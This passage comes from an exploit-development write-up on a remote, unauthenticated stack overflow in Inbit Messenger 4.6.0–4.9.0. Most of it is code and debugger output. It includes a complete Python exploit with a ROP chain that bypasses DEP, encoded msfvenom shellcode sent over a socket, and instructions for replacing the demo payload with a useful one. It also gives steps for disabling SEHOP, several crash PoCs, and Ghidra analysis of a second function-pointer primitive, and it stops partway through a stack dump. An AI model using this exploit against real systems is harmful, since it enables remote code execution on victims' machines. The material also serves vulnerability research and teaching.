0:000> dps esp L0n5
0014f9e0  0014fb40
0014f9e4  0014fb40
0014f9e8  00000200
0014f9ec  00001000
0014f9f0  00000040
0:000> db 0014fb40 L0n512
0014fb40  62 75 62 62 61 67 75 6d-70 90 90 90 90 90 90 90  bubbagump.......
0014fb50  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0014fb60  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0014fb70  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0014fb80  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0014fb90  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0014fba0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0014fbb0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0014fbc0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0014fbd0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0014fbe0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0014fbf0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0014fc00  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0014fc10  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0014fc20  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0014fc30  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0014fc40  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0014fc50  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0014fc60  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0014fc70  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0014fc80  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0014fc90  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0014fca0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0014fcb0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0014fcc0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0014fcd0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0014fce0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0014fcf0  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0014fd00  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0014fd10  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0014fd20  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0014fd30  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
```

Nice! The stack looks good. Check the shellcode address before and after the call:

```
0:000> r
eax=00000000 ebx=423c0000 ecx=fffffeb0 edx=77a45e30 esi=02864fbc edi=02864fb8
eip=766f4da0 esp=0014f9e0 ebp=00000160 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
KERNEL32!VirtualAllocStub:
766f4da0 8bff            mov     edi,edi
0:000> !address 0014fb40 

Usage:                  Stack
Base Address:           0014b000
End Address:            00150000
Region Size:            00005000 (  20.000 kB)
State:                  00001000          MEM_COMMIT
Protect:                00000004          PAGE_READWRITE
Type:                   00020000          MEM_PRIVATE
Allocation Base:        00050000
Allocation Protect:     00000004          PAGE_READWRITE
More info:              ~0k

Content source: 1 (target), length: 4c0
0:000> pt
eax=0014f000 ebx=423c0000 ecx=0014f9b0 edx=77a32870 esi=02864fbc edi=02864fb8
eip=75e08591 esp=0014f9e0 ebp=00000160 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
KERNELBASE!VirtualAlloc+0x51:
75e08591 c21000          ret     10h
0:000> !address 0014fb40 

Usage:                  Stack
Base Address:           0014f000
End Address:            00150000
Region Size:            00001000 (   4.000 kB)
State:                  00001000          MEM_COMMIT
Protect:                00000040          PAGE_EXECUTE_READWRITE
Type:                   00020000          MEM_PRIVATE
Allocation Base:        00050000
Allocation Protect:     00000004          PAGE_READWRITE
More info:              ~0k

Content source: 1 (target), length: 4c0
```

And that is a DEP bypass. The shellcode on the stack went from `PAGE_READWRITE` to `PAGE_EXECUTE_READWRITE`. All that is left to do is to replace the dummy shellcode with something useful. **Remember the following points from the previous non-DEP PoC**:

- Since we are using the `x86/shikata_ga_nai` encoder, prepend a NOP sled to the shellcode for the decoder to decode in place on the stack.
- We still need to prepend our tiny shellcode stub that will NULL the thread's activation context before we execute our shellcode!

## Unauthenticated Remote SEH Overflow DEP Bypass PoC

For demo purposes, we will modify the shellcode payload to display a notification when we have a successful exploit. Here is the final PoC:

```python
import sys, socket, struct, argparse, logging

"""
/opt/metasploit-framework/bin/msfvenom \
  -p windows/messagebox \
  ICON=WARNING          \
  TEXT="get wrecked"    \
  TITLE="LOLZ"          \
  EXITFUNC=thread       \
  -f py                 \
  -v SHELLCODE          \
  -e x86/shikata_ga_nai \
  -b '\x3E'           
"""
SHELLCODE =  b""
SHELLCODE += b"\xba\xbd\x3d\x03\xfa\xd9\xc9\xd9\x74\x24\xf4"
SHELLCODE += b"\x5b\x31\xc9\xb1\x41\x31\x53\x14\x03\x53\x14"
SHELLCODE += b"\x83\xc3\x04\x5f\xc8\xda\x11\x04\xea\xa9\xc1"
SHELLCODE += b"\xce\x3c\x80\xb8\x59\x0e\xed\xd9\x2e\x01\xdd"
SHELLCODE += b"\xaa\x46\xee\x96\xdb\xba\x65\xee\x2b\x49\x07"
SHELLCODE += b"\xcf\xa0\x7b\xc0\x40\xaf\xf6\xc3\x06\xce\x29"
SHELLCODE += b"\xdc\x58\xb0\x42\x4f\xbf\x15\xdf\xd5\x83\xde"
SHELLCODE += b"\x8b\xfd\x83\xe1\xd9\x75\x39\xfa\x96\xd0\x9e"
SHELLCODE += b"\xfb\x43\x07\xea\xb2\x18\xfc\x98\x44\xf0\xcc"
SHELLCODE += b"\x61\x77\xcc\xd3\x32\xfc\x0c\x5f\x4c\x3c\x43"
SHELLCODE += b"\xad\x53\x79\xb0\x5a\x68\xf9\x62\x8b\xfa\xe0"
SHELLCODE += b"\xe1\x91\x20\xe2\x1e\x43\xa2\xe8\xab\x07\xee"
SHELLCODE += b"\xec\x2a\xf3\x84\x09\xa7\x02\x73\x98\xf3\x20"
SHELLCODE += b"\x9f\xfa\x38\x9a\x97\xd5\x6a\x52\x42\xac\x50"
SHELLCODE += b"\x0d\x03\xe1\x5a\x22\x49\x16\xfd\x45\x91\x19"
SHELLCODE += b"\x88\xff\x6a\x5d\x65\x31\x92\xc1\xfe\xd2\x77"
SHELLCODE += b"\x50\xe8\x65\x88\xab\x17\xf0\x32\x5c\x8f\x6f"
SHELLCODE += b"\xd1\x7c\x0e\x18\x1a\x4f\xbe\xbc\x34\xda\xcd"
SHELLCODE += b"\x59\xb7\x14\xea\x2a\x6b\x71\x06\xa2\x72\x2f"
SHELLCODE += b"\xe9\xe1\x7e\x59\xd7\x5a\xc4\xf1\x75\x17\x86"
SHELLCODE += b"\x85\x65\x8c\xa4\x61\xca\x33\xb7\x8d\x9c\x93"
SHELLCODE += b"\x68\x52\x7c\x4c\x25\xdd\x30\xd6\x84\x3a\x40"
SHELLCODE += b"\xba\xc2\xb8\xd9\xa0\x63\xaa\xbc\x42\x2c\x44"
SHELLCODE += b"\x49\xf9\xa9\xf7\xdd\x9a\x54\x8c\x3d\x54\x5e"
SHELLCODE += b"\xe4\x71\xb2\x6b\x7c\x68\x8b\xb9\x14\x5a\xbf"
SHELLCODE += b"\x6c\xbb\x65\xef\xbe\xfb\xc9\xef\x94\xf3"

BANNER = """\033[0m\033[1;35m
╔════════════════════════════════════════════════════════════════════════════════╗
║\033[0m Inbit Messenger v4.6.0 - v4.9.0 Unauthenticated Remote SEH Overflow DEP Bypass \033[1;35m║
╚════════════════════════════════════════════════════════════════════════════════╝\033[0m
 by: \033[1;36m █████╗      ██████╗ ███████╗██╗   ██╗
     \033[1;36m██╔══██╗     ██╔══██╗██╔════╝██║   ██║
     \033[1;36m███████║ ███ ██████╔╝█████╗   ██╗ ██═╝
     \033[1;36m██╔══██║     ██╔══██╗██╔══╝     ██╔╝  
     \033[1;36m██║  ██║     ██║  ██║███████╗   ██║   
     \033[1;36m╚═╝  ╚═╝     ╚═╝  ╚═╝╚══════╝   ╚═╝   
\033[0m"""

BAD_BYTES = b"\x3e" # >
PAYLOAD_LENGTH = 2000

nSEH = b"L0Lz"                       # NOTE: not used
SEH  = struct.pack("<I", 0x2636e91e) # ipworks6.dll | mov eax, dword [ebp+0x0C] ; push ecx ; mov ecx, edi ; call dword [eax+0x2C] 

# NOTE: sets the TEB's ACTIVATION_CONTEXT_STACK.ActiveFrame = NULL
NULL_ACT_CTX_STUB  = b"\x31\xC0\xBB\x00\x10"
NULL_ACT_CTX_STUB += b"\x00\x00\x64\x8B\x48"
NULL_ACT_CTX_STUB += b"\x18\x39\x99\xA8\x01"
NULL_ACT_CTX_STUB += b"\x00\x00\x7C\x0A\x8B"
NULL_ACT_CTX_STUB += b"\x99\xA8\x01\x00\x00"
NULL_ACT_CTX_STUB += b"\x89\x03\xEB\x06\x89"
NULL_ACT_CTX_STUB += b"\x81\xB0\x01\x00\x00" 

PLACEHOLDERS = [
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# KERNEL32!VirtualAllocStub
# https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  0x41414141, # virtual address of KERNEL32!VirtualAllocStub from IAT
  0x42424242, # address of shellcode (same as lpAddress)
  0x69696969, # arg1: lpAddress 
  0x00000200, # arg2: dwSize (512 bytes)
  0x00001000, # arg3: flAllocationType (MEM_COMMIT = 0x00001000)
  0x00000040, # arg4: flProtect (PAGE_EXECUTE_READWRITE = 0x00000040)
]

ROP = [
  # NOTE: EDI = virtual address of KERNEL32!VirtualAllocStub
  0x2637abeb, # pop eax ; ret  
  0x263b4150, # // IAT for KERNEL32!VirtualAllocStub
  0x2635262e, # mov eax, dword [eax] ; pop esi ; retn 0x0004
  0x69696969, # // esi = junk
  0x2634c723, # push eax ; pop edi ; pop esi ; ret 
  0x69696969, # // junk from 'retn 0x0004' @ 0x2635262e
  0x69696969, # // esi = junk
  # NOTE: ESI = stack address of KERNEL32!VirtualAllocStub placeholder
  0x2637abeb, # pop eax ; ret  
  0x263c8b00, # // eax = data cave address
  0x2636a0d1, # push esp ; add byte [eax], al ; pop esi ; retn 0x0004 
  0x26356073, # mov eax, esi ; pop esi ; ret  
  0x69696969, # // junk from 'retn 0x0004' @ 0x2636a0d1
  0x69696969, # // esi = junk
  0x26381110, # pop ecx ; ret  
  0xffffff7c, # // ecx = -132
  0x263ac3f6, # add eax, ecx ; ret  
  0x2634c744, # push eax ; pop esi ; retn 0x0004 
  # NOTE: write KERNEL32!VirtualAllocStub placeholder
  0x2635805a, # mov dword [esi], edi ; pop edi ; pop esi ; ret  
  0x69696969, # // junk from 'retn 0x0004' @ 0x2634c744
  0x69696969, # // edi = junk
  0x69696969, # // esi = junk
  # NOTE: ESI = stack address of lpAddress placeholder
  0x2637abeb, # pop eax ; ret  
  0x263c8b00, # // eax = data cave address
  0x2636a0d1, # push esp ; add byte [eax], al ; pop esi ; retn 0x0004 
  0x26356073, # mov eax, esi ; pop esi ; ret  
  0x69696969, # // junk from 'retn 0x0004' @ 0x2636a0d1
  0x69696969, # // esi = junk
  0x26381110, # pop ecx ; ret  
  0xffffff4c, # // ecx = -180
  0x263ac3f6, # add eax, ecx ; ret  
  0x2634c744, # push eax ; pop esi ; retn 0x0004 
  # NOTE: EAX = stack address of shellcode after ROP chain
  0x2636f279, # pop ebp ; ret 
  0x69696969, # // junk from 'retn 0x0004' @ 0x2634c744 
  0x0000015c, # // ebp = 348
  0x2639fa5d, # add eax, ebp ; ret  
  # NOTE: write lpAddress placeholder
  0x263adf17, # mov dword [esi], eax ; pop eax ; pop esi ; ret  
  0x69696969, # // eax = junk
  0x69696969, # // esi = junk
  # NOTE: ESI = stack address of return placeholder
  0x2637abeb, # pop eax ; ret  
  0x263c8b00, # // eax = data cave address
  0x2636a0d1, # push esp ; add byte [eax], al ; pop esi ; retn 0x0004 
  0x26356073, # mov eax, esi ; pop esi ; ret  
  0x69696969, # // junk from 'retn 0x0004' @ 0x2636a0d1
  0x69696969, # // esi = junk
  0x26381110, # pop ecx ; ret  
  0xffffff04, # // ecx = -252
  0x263ac3f6, # add eax, ecx ; ret  
  0x2634c744, # push eax ; pop esi ; retn 0x0004 
  # NOTE: EAX = stack address of shellcode after ROP chain
  0x2636f279, # pop ebp ; ret 
  0x69696969, # // junk from 'retn 0x0004' @ 0x2634c744 
  0x00000160, # // ebp = 352
  0x2639fa5d, # add eax, ebp ; ret  
  # NOTE: write return address placeholder
  0x263adf17, # mov dword [esi], eax ; pop eax ; pop esi ; ret  
  0x69696969, # // eax = junk
  0x69696969, # // esi = junk
  # NOTE: stack pivot to placeholders
  0x2637abeb, # pop eax ; ret  
  0x263c8b00, # // eax = data cave address
  0x2636a0d1, # push esp ; add byte [eax], al ; pop esi ; retn 0x0004 
  0x26356073, # mov eax, esi ; pop esi ; ret  
  0x69696969, # // junk from 'retn 0x0004' @ 0x2636a0d1
  0x69696969, # // esi = junk
  0x26381110, # pop ecx ; ret  
  0xfffffeb0, # // ecx = -336
  0x263ac3f6, # add eax, ecx ; ret  
  0x263a5ded, # xchg eax, esp ; xor eax, eax ; pop edi ; pop esi ; pop ebx ; ret
  # NOTE: END OF CHAIN
  0x69696969, 
]

def exploit(targetIp:str, targetPort:int) -> None:
  pkt  = b""
  pkt += b"".join([struct.pack("<I", _) for _ in PLACEHOLDERS])
  pkt += (b"A" * (40 - len(pkt)))
  # NOTE: SEH stack pivot starts here for gadget @ 0x263a5ded
  pkt += nSEH    # 'pop edi' from gadget @ 0x263a5ded
  pkt += SEH     # 'pop esi' from gadget @ 0x263a5ded
  pkt += b'L0Lz' # 'pop ebx' from gadget @ 0x263a5ded
  # NOTE: pivot stack just past the gadget @ 0x263a5ded
  pkt += struct.pack("<I", 0x263ac8ec) # ipworks6.dll | add esp, 0x20 ; pop ebp ; ret
  # NOTE: filler up to the second SEH pivot gadget (minus 16 for 3x POP and 0x263ac8ec gadget)
  pkt += (b"C" * (0x2C - 16))
  # NOTE: second SEH stack pivot gadget to point stack to nSEH
  pkt += struct.pack("<I", 0x263a5ded) # ipworks6.dll | xchg eax, esp ; xor eax, eax ; pop edi ; pop esi ; pop ebx ; ret
  pkt += b'L0Lz' # 'pop ebp' from gadget @ 0x263ac8ec
  # NOTE: gadget @ 0x263ac8ec pivots the stack here to begin execution
  pkt += b"".join([struct.pack("<I", _) for _ in ROP])
  # NOTE: shellcode follows right after ROP chain from *static* offsets in chain
  pkt += NULL_ACT_CTX_STUB
  pkt += (b"\x90" * 32) # NOP sled for shikata_ga_nai decoder
  pkt += SHELLCODE
  # NOTE: need to send 1600+ bytes to overwrite beyond top of thread's stack
  pkt += (b"B" * (PAYLOAD_LENGTH - len(pkt)))
  # NOTE: check for bad bytes
  for c in pkt:
    if c in BAD_BYTES:
      logging.error(f"found bad byte 0x{c:02x} in payload")
      sys.exit(-1)
  logging.info(f"sending {len(pkt)} byte payload to {targetIp}:{targetPort} ...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((targetIp, targetPort))
  s.send(b"<" + pkt)
  s.close()
  logging.success("DONE")

if __name__ == '__main__':
  # parse arguments
  parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter, usage=BANNER)
  parser.add_argument('-t', '--target', help='target IP',   type=str, required=True)
  parser.add_argument('-p', '--port',   help='target port', type=int, required=False, default=10883)
  args = parser.parse_args()
  # define logger
  logging.basicConfig(format='[%(asctime)s][%(levelname)s] %(message)s', datefmt='%d %b %Y %H:%M:%S', level='INFO')
  logging.SUCCESS = logging.CRITICAL + 1
  logging.addLevelName(logging.SUCCESS, '\033[0m\033[1;32mGOOD\033[0m')
  logging.addLevelName(logging.ERROR,   '\033[0m\033[1;31mFAIL\033[0m')
  logging.addLevelName(logging.WARNING, '\033[0m\033[1;33mWARN\033[0m')
  logging.addLevelName(logging.INFO,    '\033[0m\033[1;36mINFO\033[0m')
  logging.success = lambda msg, *args: logging.getLogger(__name__)._log(logging.SUCCESS, msg, args)
  # print banner
  print(BANNER)
  # run exploit
  exploit(args.target, args.port)
```

To test this PoC, we will run it against Windows Server 2019. Since that is a Windows Server build, the DEP policy will be enabled by default. However, since our exploit is taking advantage of an SEH overflow to redirect execution, we will need to disable SEHOP:

- https://msrc-blog.microsoft.com/2009/02/02/preventing-the-exploitation-of-structured-exception-handler-seh-overwrites-with-sehop/

SEHOP detects `EXCEPTION_REGISTRATION_RECORD` corruption *without* needing to re-compile an application or rely on per-module exploit mitigation solutions such as SafeSEH. It accomplishes this by introducing an additional link at the end of the SEH chain, and verifying that this link can be reached by walking the SEH chain at the time of an exception. Due to the `EXCEPTION_REGISTRATION_RECORD.Next` field of the `EXCEPTION_REGISTRATION_RECORD` being stored **before** the handler field, this makes it impossible to corrupt the SEH handler with our stack overflow without also corrupting `EXCEPTION_REGISTRATION_RECORD.Next` and breaking the entire chain. SEHOP was introduced with Windows Vista SP1 (disabled by default) and Windows Server 2008 (enabled by default) and has remained in this semi-enabled state (disabled on workstations, enabled on servers).

To bypass SEHOP, we would need a remote information leak that gives us the following:

- A stack address in the thread we are overwriting
- An address in `ntdll.dll` so we can calculate the offset to the final exception handler that must be at the end of the SEH list

Then we could overwrite the exception handler in our overflow and "re-create" the SEH chain to pass this check. Info for this technique can be found here:

- https://doc.lagout.org/security/Reversing%20.%20cracking/Bypassing%20SEHOP.pdf
- https://www.ffri.jp/assets/files/research/research_papers/SEH_Overwrite_CanSecWest2010.pdf

However, we do not have this additional remote info leak vulnerability so we will need to disable SEHOP for this test of the DEP bypass:

![34](./img/34.png)

Set the SEHOP field in the Windows Security GUI above to `Off by default` and then restart the server. Now we can use the PoC to bypass DEP:

https://raw.githubusercontent.com/a-rey/exploits/main/writeups/Inbit_Messenger/v4.6.0/img/win2019_sehop.mov

## Finding Another Way

As of right now, we have only looked at this vulnerability assuming control over the SEH handler. We then took this and made a DEP bypass to work on Windows Server builds. However, we encountered SEHOP as a blocker from making our exploit work on default installations of Windows servers. In the hopes of finding something that will work, we will take another look at this vulnerability and see if we can exploit it in another way...

The reason we focused on an SEH exploit was because we noticed that the application is compiled with stack cookies enabled. We can see this by sending a PoC that does not cause an exception by overwriting beyond the thread's stack as we have done previously:

```python
import sys, socket

# NOTE: here we overflow the stack buffer but **do not** overflow the thread's stack
pkt = b"<" + (b"A" * 500)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], int(sys.argv[2])))
s.send(pkt)
s.close()
```

Sending this modified PoC results in the following exception in WinDbg:

```
STATUS_STACK_BUFFER_OVERRUN encountered
(1b98.1f2c): Break instruction exception - code 80000003 (first chance)
eax=00000000 ebx=00000001 ecx=75bc07c4 edx=0014f381 esi=00000000 edi=00000000
eip=75c94447 esp=0014f4e4 ebp=0014f574 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
KERNELBASE!UnhandledExceptionFilter+0x57:
75c94447 cc              int     3
```

`STATUS_STACK_BUFFER_OVERRUN` is commonly found when a stack cookie check fails. This means that **we cannot exit or return from the vulnerable function** or the OS will catch our overflow and terminate the process before we get execution. To get around this, we need to find another **non-SEH** way to get execution **before** the vulnerable function exits after our overflow. 

## Vulnerability Reverse Engineering

Our previous efforts at understanding this stack buffer overflow vulnerability in Ghidra gave us the following information:

```c
void FUN_00466b7d(...) {
  char local_3a;
  char local_39;
  char local_38 [48];
  int iVar5
  
  int iVar1 = recv(socket, &local_3a, 1, 0)
  if (iVar1 > 0) {
    if (local_3a == '\x1f') {
      // not important
    } else {
      // this is the start of the XML tag parsing
      if (local_3a == '<') {   
        do {
          while (true) {
            iVar1 = recv(socket, &local_39, 1, 0);
            if (iVar1 != 1) {
              break;
            }
            // this is the bad byte check to stop the overflow
            if (local_39 == '>') {
              // not important ... yet ;)
            }
            local_38[iVar5] = local_39;
            iVar5++;
          }
          if (9 < (local_3a - 0x30)) {
            break;
          }
          // this is the stack buffer overflow
          local_38[iVar5] = local_3a;
          iVar5++;
        } while (iVar5 < 10);
      }
    }
  }
  // not important
}
```

Continuing our analysis of `FUN_00466b7d` shows some interesting processing happens after the `>` is encountered in the user input:

![36](./img/36.png)

We see here the following additional functionality now:

```c
void FUN_00466b7d(...) {
  int *piVar2;
  int **local_40;
  int **local_44;
  char local_3a;
  char local_39;
  char local_38 [48];
  int iVar5
  
  int iVar1 = recv(socket, &local_3a, 1, 0)
  if (iVar1 > 0) {
    if (local_3a == '\x1f') {
LAB_00466dd6:
      // not important ... yet ;)
    } else {
      // this is the start of the XML tag parsing
      if (local_3a == '<') {   
        do {
          while (true) {
            iVar1 = recv(socket, &local_39, 1, 0);
            if (iVar1 != 1) {
              break;
            }
            // this is the bad byte check to stop the overflow
            if (local_39 == '>') {
              local_38[iVar5] = '\0';
              if (!stricmp(local_38, "policy-file-request/")) {
                // not important
			 }
              if (iVar5 == 0) {
                goto LAB_00466e64;
              }
              if (iVar5 == 1) {
                // not important
              }
              piVar2 = (int *)_atol(local_38);
              *local_44 = piVar2;
              if (piVar2 != (int *)0x0) {
                *local_40 = piVar2;
                goto LAB_00466dd6;
              }
              goto LAB_00466e64;
            }
            // this is the stack buffer overflow
            local_38[iVar5] = local_39;
            iVar5++;
          }
          if (9 < (local_3a - 0x30)) {
            break;
          }
          local_38[iVar5] = local_3a;
          iVar5++;
        } while (iVar5 < 10);
      }
    }
  }
  // not important
LAB_00466e64:
  // !!!DANGER!!! stack cookie check and exit
}
```

It seems like the application receives up until it encounters the `>` character byte-by-byte and then takes the resulting stack buffer we overflow and passes it to `atol()` as long as it received more than 1 character between the `<>` in the buffer:

- https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/atol-atol-l-wtol-wtol-l?view=msvc-170

This function will take a string representation of an integer and converts it to an actual integer. Since a NULL byte is not a bad byte, we can send the following buffer and have the application parse out the number 69 while also overflowing the stack buffer at the same time:

```python
b"<69\x00" + (b"A" * 100) + b">"
```

As long as the returned integer is not 0, we go to an interesting label called `LAB_00466dd6`. Jumping to this label in Ghidra shows the following disassembly:

![35](./img/35.png)

We can convert this to the following C code now:

```c
void FUN_00466b7d(...) {
  int *piVar2;
  int **local_40;
  int **local_44;
  char local_3a;
  char local_39;
  char local_38 [48];
  int iVar5
  
  int iVar1 = recv(socket, &local_3a, 1, 0)
  if (iVar1 > 0) {
    if (local_3a == '\x1f') {
    // we are sent here after atol() is called on our buffer
LAB_00466dd6:
      do {
        piVar2 = (int *)0xfc64;
        if ((int)*local_40 < 0xfc64) {
          piVar2 = *local_40;
        }
        iVar1 = recv(socket,/* some buffer? */,(int)piVar2, 0);
        if (iVar1 == 0) break;
        if (iVar1 == -1) break;
        // WTF is this?
        (**(code **)(*(int *)local_4c.tv_usec + 0x38))(/* some buffer? */, iVar1);
        *local_40 = (int *)((int)*local_40 - iVar1);
      } while (0 < (int)*local_40);
    } else {
      // this is the start of the XML tag parsing
      if (local_3a == '<') {   
        do {
          while (true) {
            iVar1 = recv(socket, &local_39, 1, 0);
            if (iVar1 != 1) {
              break;
            }
            // this is the bad byte check to stop the overflow
            if (local_39 == '>') {
              local_38[iVar5] = '\0';
              if (!stricmp(local_38, "policy-file-request/")) {
                // not important
			 }
              if (iVar5 == 0) {
                goto LAB_00466e64;
              }
              if (iVar5 == 1) {
                // not important
              }
              piVar2 = (int *)_atol(local_38);
              *local_44 = piVar2;
              if (piVar2 != (int *)0x0) {
                *local_40 = piVar2;
                goto LAB_00466dd6;
              }
              goto LAB_00466e64;
            }
            // this is the stack buffer overflow
            local_38[iVar5] = local_39;
            iVar5++;
          }
          if (9 < (local_3a - 0x30)) {
            break;
          }
          local_38[iVar5] = local_3a;
          iVar5++;
        } while (iVar5 < 10);
      }
    }
  }
  // not important
LAB_00466e64:
  // !!!DANGER!!! stack cookie check and exit
}
```

Generally, the application takes the value parsed from `atol()` in `local_40` and then checks to make sure it is less than `0xfc64`. Then the application receives that many bytes from the user socket into some buffer we do not know about. However, there is a line in the Ghidra disassembly that does not make any sense:

```c
(**(code **)(*(int *)local_4c.tv_usec + 0x38))(*(undefined4 *)((int)this + 0x4c), iVar1);
```

Better to look at the actual assembly at that point:

```assembly
MOV  ECX, dword [EBP - 0x44]
MOV  EAX, dword [ECX]
PUSH EBX
PUSH dword [ESI + 0x4c]
CALL dword [EAX + 0x38]
MOV  EAX, dword [EBP - 0x3c]
SUB  dword [EAX],EBX
```

We seem to be pulling a local variable into `ECX` that is a pointer to some structure that contains a pointer at offset `0x38` we will attempt to call as a function. The function that gets called takes in 2 arguments with the second one being the number of bytes received and the first some pointer we do not understand yet. A simple PoC to test this theory is to send the following buffer and see what happens with a breakpoint at the `CALL dword [EAX + 0x38]` instruction at address `0x00466e21` in WinDbg:

```python
import sys, socket

pkt  = b"<"         # start of XML tag
pkt += b"69\x00"    # the number parsed by atol() -> 69
pkt += (b"A" * 100) # random data into the overflowed buffer
pkt += b">"         # end of XML tag
pkt += (b"B" * 69)  # random data at the end of the packet matching the number of bytes in the tag

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], int(sys.argv[2])))
s.send(pkt)
s.close()
```

Sending this PoC has a very interesting result in WinDbg:

```
(1d2c.5e4): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=41414141 ebx=00000045 ecx=0014fa34 edx=00000001 esi=04057b68 edi=76ed23a0
eip=00466e21 esp=0014f8ac ebp=0014fa10 iopl=0         nv up ei pl nz ac po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010213
IMS+0x66e21:
00466e21 ff5038          call    dword ptr [eax+38h]  ds:0023:41414179=????????
```

The application tried to dereference a pointer under our control in the overflowed buffer of `A` values in the PoC!

## Indirect Function Pointer Control

We have a PoC that gives us control over a pointer the application tries to read in order to know where to direct execution to. **This is an indirect function pointer**. Basically a pointer to a pointer. At first glance, this seems juicy. However, it becomes problematic as we try to find a way to make this exploitable. We need to find an address we can put in our buffer that is a valid pointer to an **address** of where to redirect execution. At the crash from the PoC above, inspect the environment to see what we control:

```
(1d2c.5e4): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=41414141 ebx=00000045 ecx=0014fa34 edx=00000001 esi=04057b68 edi=76ed23a0
eip=00466e21 esp=0014f8ac ebp=0014fa10 iopl=0         nv up ei pl nz ac po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010213
IMS+0x66e21:
00466e21 ff5038          call    dword ptr [eax+38h]  ds:0023:41414179=????????
0:000> dps esp L0n10
0014f8ac  00677440 IMS+0x277440
0014f8b0  00000045
0014f8b4  86ca10bd
0014f8b8  04057c04
0014f8bc  04057b68
0014f8c0  04057c00
0014f8c4  00012024
0014f8c8  0014f968
0014f8cc  0000001c
0014f8d0  0014fb98
0:000> db 00677440 L0n32
00677440  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
00677450  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
0:000> ? 45
Evaluate expression: 69 = 00000045
```

Unfortunately the stack does not see to be under our control when this `CALL` instruction is executed. However, we have solid control over the 2 arguments to the function we will end up calling. The first argument contains our second buffer of `B` values in our payload and the second argument is the number of bytes we sent to be parsed by `atol()`. 

Ideally, we want to find a way to have the application execute a indirect pointer to a stack pivot gadget that will move the stack into the buffer we control. This is similar to the SEH pivot methodology. However, this time we cannot use the gadget address itself. This time we need to find an address that contains the address of our gadget. First find out how far away our controlled payload is from the stack of this `CALL` instruction:

```
0:000> dps esp L0n100
0014f8ac  00677440 IMS+0x277440
0014f8b0  00000045
0014f8b4  86ca10bd
0014f8b8  04057c04
0014f8bc  04057b68
0014f8c0  04057c00
0014f8c4  00012024
0014f8c8  0014f968
0014f8cc  0000001c
0014f8d0  0014fb98
0014f8d4  75034625 mswsock!WSPSelect+0x305
0014f8d8  f248e40a
0014f8dc  00000000
0014f8e0  75034320 mswsock!WSPSelect
0014f8e4  75034600 mswsock!WSPSelect+0x2e0
0014f8e8  00000000
0014f8ec  0000001c
0014f8f0  009485e8
0014f8f4  0014f980
0014f8f8  7789ac90 ntdll!RtlpAllocateHeapInternal+0x8c0
0014f8fc  00000000
0014f900  00000000
0014f904  00000000
0014f908  00000000
0014f90c  00000000
0014f910  000000ae
0014f914  00000000
0014f918  00000001
0014f91c  0014fa44
0014f920  00000001
0014f924  00eb5200
0014f928  00000000
0014f92c  00000000
0014f930  0014fb34
0014f934  00000000
0014f938  0014fa64
0014f93c  0014f984
0014f940  4004667f
0014f944  00000000
0014f948  4004667f
0014f94c  0093fdc0
0014f950  0014fa50
0014f954  00948538
0014f958  00000004
0014f95c  0014fb98
0014f960  0014fb98
0014f964  00000000
0014f968  00000000
0014f96c  0000044c
